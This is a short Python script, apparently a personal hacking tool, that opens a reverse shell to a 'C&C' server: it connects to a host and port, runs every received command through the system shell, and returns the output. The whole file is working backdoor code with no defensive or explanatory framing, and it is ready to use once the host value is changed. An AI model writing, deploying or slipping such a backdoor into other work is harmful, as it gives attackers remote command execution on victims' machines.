#!/usr/bin/python
#
# tjcwilk - 03/10/2013
#    Creates a reverse shell back to a listning server
#

import socket
import subprocess

# Define C&C
HOST = '127.0.0.1'      # The remote host
PORT = 8080             # The same port as used by the server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while 1:
    # recv command line param
    data = s.recv(1024)
    # execute command line
    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    # grab output from commandline
    stdout_value = proc.stdout.read() + proc.stderr.read()

    # send back to C&C
    s.send(stdout_value)

# Close the socket
s.close()




